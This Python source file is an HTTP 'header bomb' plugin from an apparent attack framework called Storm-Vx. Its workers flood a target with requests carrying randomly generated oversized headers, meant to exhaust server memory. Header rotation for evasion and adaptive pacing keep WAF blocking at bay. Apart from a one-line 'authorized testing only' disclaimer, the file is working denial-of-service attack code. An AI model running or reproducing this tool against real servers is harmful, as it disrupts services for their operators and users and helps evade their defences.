#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_header_bomb — HTTP Header Bomb Attack Plugin

Sends requests with massive headers (8KB+) to exhaust server
memory and header parsing resources. Many servers allocate
memory proportional to header size before processing.
Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
from typing import Dict, Any


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin, ResponseClass
from vf_common import C, rand_str
import aiohttp


__all__ = ["HeaderBombPlugin"]


class HeaderBombPlugin(AttackPlugin):
    """HTTP Header Bomb — send requests with oversized headers.

    Generates requests containing extremely large headers to
    consume server memory during header parsing. Each request
    carries ~8KB of header data, forcing the server to allocate
    buffers and parse through all of it.
    """

    meta = PluginMeta(
        name='header_bomb',
        version='1.0.0',
        plugin_type='attack',
        description='Header bomb — oversized headers (8KB+) to exhaust server memory',
        tags=['http', 'header', 'memory-burn', 'flood'],
        priority=40,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """Header bomb worker: send requests with massive headers."""
        _ssl = context.ssl_param

        pages = context.page_targets or [context.url]
        delay_ms = context.extra.delay_ms
        header_size_kb = getattr(context.extra, 'header_size_kb', 8)

        while not self._stop_event.is_set():
            try:
                url = random.choice(pages)

                # Build massive headers with fresh evasion rotation
                headers = self._get_fresh_headers(context, "document")
                # Add multiple large headers totaling ~header_size_kb KB
                num_headers = random.randint(4, 8)
                for i in range(num_headers):
                    header_name = f"X-Bomb-{rand_str(4)}-{i}"
                    header_value = rand_str((header_size_kb * 1024) // num_headers)
                    headers[header_name] = header_value

                t = time.monotonic()
                try:
                    async with context.session.get(url, headers=headers,
                                                   ssl=_ssl, allow_redirects=False) as resp:
                        rt = time.monotonic() - t
                        # BUG-FIX v33: Use _process_response() instead of raw status
                        # check. Previously, header_bomb never called the response
                        # pipeline, meaning: no WAF detection, no target weighting,
                        # no adaptive pacing, and no per-worker failure tracking.
                        resp_headers = dict(resp.headers)
                        response_class = self._process_response(resp.status, resp_headers, url=url[:60], worker_id=worker_id)
                        ok = response_class in (ResponseClass.OK, ResponseClass.AUTH_REQUIRED, ResponseClass.REDIRECT)
                        await self._record("HDR-BOMB", ok, resp.status, rt, url=url[:60])
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.monotonic() - t
                    self._on_request_result(worker_id, False)
                    await self._record("HDR-BOMB", False, 0, rt,
                                       err=type(exc).__name__, url=url[:60])

                # BUG-FIX v33: Use adaptive sleep instead of fixed sleep.
                # Previously, header_bomb used plain asyncio.sleep() which
                # never backs off even when the server is rate-limiting or
                # WAF is blocking. This wastes bandwidth and triggers more
                # aggressive WAF blocking that affects other plugins.
                await self._adaptive_sleep(worker_id, delay_ms)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                self._on_request_result(worker_id, False)
                await self._record("HDR-BOMB", False, 0, 0, err=type(exc).__name__)
                await asyncio.sleep(0.1)

